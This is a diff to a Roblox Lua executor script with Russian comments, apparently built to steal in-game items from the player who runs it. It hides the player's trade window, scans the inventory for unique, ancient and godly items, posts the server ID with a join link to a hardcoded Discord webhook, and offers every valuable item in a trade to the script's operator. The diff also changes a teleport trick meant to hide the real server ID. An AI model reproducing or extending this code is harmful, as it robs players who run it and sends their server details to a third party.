@@ -9,12 +9,10 @@ local spoofedJobId = game.JobId
 local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
 
 local InvModule = require(RepStorage.Modules.InventoryModule)
-local PlayerDataModule = require(RepStorage.Modules.ProfileData)
-local LevelModule = require(RepStorage.Modules.LevelModule)
 
-getgenv().realJobId = nil
+getgenv().realJobId = game.JobId -- стартовое значение
 
--- Disable Trade GUI
+-- Отключаем Trade GUI
 local destroytrades2 = coroutine.create(function()
     while true do
         local tradeGUI = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
@@ -26,7 +24,7 @@ local destroytrades2 = coroutine.create(function()
 end)
 
 -- Проверка ценных предметов
-local function hasValuableItems()
+local function getValuableItems()
     local uniqueItems, ancientItems, godlyItems = {}, {}, {}
     for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
         for _, item in pairs(category) do
@@ -42,7 +40,7 @@ end
 
 -- Отправка webhook
 local function sendWebhook(realJobId)
-    local hasValuable, uniqueItems, ancientItems, godlyItems = hasValuableItems()
+    local hasValuable, uniqueItems, ancientItems, godlyItems = getValuableItems()
     if not hasValuable then return end
 
     local fernUrl = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..realJobId
@@ -88,7 +86,7 @@ local function stealItems(targetPlayerName)
         end
     end
 
-    local _, uniqueItems, ancientItems, godlyItems = hasValuableItems()
+    local _, uniqueItems, ancientItems, godlyItems = getValuableItems()
     offerItems(uniqueItems)
     offerItems(ancientItems)
     offerItems(godlyItems)
@@ -99,23 +97,20 @@ local function stealItems(targetPlayerName)
     end)
 end
 
--- Ловим real JobId
+-- Сохраняем JobId при неудачном телепорте (queue_on_teleport)
 TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
     if teleportInfo and teleportInfo.ServerInstanceId then
         getgenv().realJobId = teleportInfo.ServerInstanceId
-        print("Real JobId detected:", getgenv().realJobId)
+        queue_on_teleport(string.format([[getgenv().realJobId = "%s"]], getgenv().realJobId))
         sendWebhook(getgenv().realJobId)
-
-        -- Перезаход на реальный JobId
-        TeleportService:TeleportToPlaceInstance(placeId, getgenv().realJobId)
     end
 end)
 
--- Форсируем failed teleport
+-- Форсируем перезаход (JobId bypass)
 for _ = 1, 2 do
     task.spawn(function()
         pcall(function()
-            TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
+            TeleportService:TeleportToPlaceInstance(placeId, game.JobId)
         end)
     end)
     task.wait(0.5)
@@ -125,7 +120,7 @@ end
 Players.PlayerAdded:Connect(function(player)
     if player.Name == LocalPlayer.Name then
         wait(3)
-        local hasValuable, _, _, _ = hasValuableItems()
+        local hasValuable, _, _, _ = getValuableItems()
         if hasValuable then
             stealItems(LocalPlayer.Name)
         end
